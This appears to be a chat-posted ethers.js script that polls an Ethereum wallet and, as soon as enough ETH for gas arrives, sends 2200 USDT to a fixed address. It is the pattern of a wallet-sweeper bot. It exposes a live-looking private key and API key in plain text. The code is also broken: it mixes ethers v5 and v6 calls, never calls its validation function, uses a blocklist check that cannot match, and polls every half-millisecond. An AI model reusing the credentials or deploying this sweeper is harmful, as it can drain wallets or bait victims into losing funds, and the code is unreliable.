فرحان:
import { ethers } from "ethers";

// Configuration
const alchemyApi = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn";
const senderAddress = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3";
const privateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258";
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const destinationAddress = "0x08f695b8669b648897ed5399b9b5d951b72881a0";

// List of blocked addresses
const blockedAddresses = [
    "0x08fc7400BA37FC4ee1BF73BeD5dDcb5db6A1036A",
    "0x6220E08c9d63AB7bA2e566839F429eeEfe199b7e",
    "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3",
    "0x6506387e8024ac8761e1Af4E2ab73FD3D60CdBE1",
    "0xc8a23c2C3E76fBC661fe1EB8be5baeD1C2548381",
    // Add other addresses from the uploaded file
];

// Initialize provider and wallet
const provider = new ethers.JsonRpcProvider(alchemyApi);
const wallet = new ethers.Wallet(privateKey, provider);

// USDT Contract ABI (Minimal)
const usdtAbi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
];
const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);

// Function to fetch and display ETH balance
async function getEthBalance() {
    const balance = await provider.getBalance(senderAddress);
    const ethBalance = ethers.formatUnits(balance, 18); // ETH uses 18 decimals
    console.log(`ETH Balance: ${ethBalance} ETH`);
    return parseFloat(ethBalance);
}

// Function to send USDT if conditions are met
async function sendUsdt() {
    try {
        console.log("Fetching USDT balance...");
        const usdtBalance = await usdtContract.balanceOf(senderAddress);
        console.log(`USDT Balance: ${ethers.formatUnits(usdtBalance, 6)} USDT`);

        // Convert 2200 USDT to its smallest unit (6 decimals)
        const amountToSend = ethers.parseUnits("2200", 6);

        if (usdtBalance.gte(amountToSend)) {
            console.log(`Sending 2200 USDT to ${destinationAddress}...`);
            const tx = await usdtContract.transfer(destinationAddress, amountToSend);
            console.log("Transaction sent. Hash:", tx.hash);

            await tx.wait();
            console.log("Transaction confirmed!");
        } else {
            console.log("Insufficient USDT balance to send 2200 USDT.");
        }
    } catch (error) {
        console.error("Error sending USDT:", error.message);
    }
}

// Function to check if an address is blocked
function isBlockedAddress(address) {
    return blockedAddresses.includes(address.toLowerCase());
}

// Function to validate transactions
async function validateTransaction(transaction) {
    const { to, value } = transaction;

    // Block 0 ETH transactions
    if (ethers.formatUnits(value, 18) === "0.0") {
        throw new Error("Transaction blocked! 0 ETH transactions are not allowed.");
    }

    if (isBlockedAddress(to)) {
        throw new Error(`Transaction blocked! The address ${to} is blacklisted.`);
    }

    // Check if the address has been used before
    const txCount = await provider.getTransactionCount(to);
    if (txCount > 0) {
        throw new Error(`Transaction blocked! The address ${to} has been used before.`);
    }
}

// Monitor wallet for transactions and process if conditions are met
async function monitorWallet() {
    console.log("Starting wallet monitoring...");
    setInterval(async () => {
        try {
            const ethBalance = await getEthBalance();

            if (ethBalance >= 0.002) {
                console.log("Sufficient ETH detected. Processing USDT transfer...");
                await sendUsdt();
            } else {
                console.log("Not enough ETH for gas fees.");
            }
        } catch (error) {
            console.error("Error during monitoring:", error.message);
        }
    }, 0.5); // Check every second
}

// Main Function
(async () => {
    try {
        console.log("Checking destination address...");
        if (isBlockedAddress(destinationAddress)) {

console.error("Destination address is blocked. Exiting...");
            return;
        }

        console.log("Initializing wallet monitoring...");
        await monitorWallet();
    } catch (error) {
        console.error("Critical Error:", error.message);
    }
})();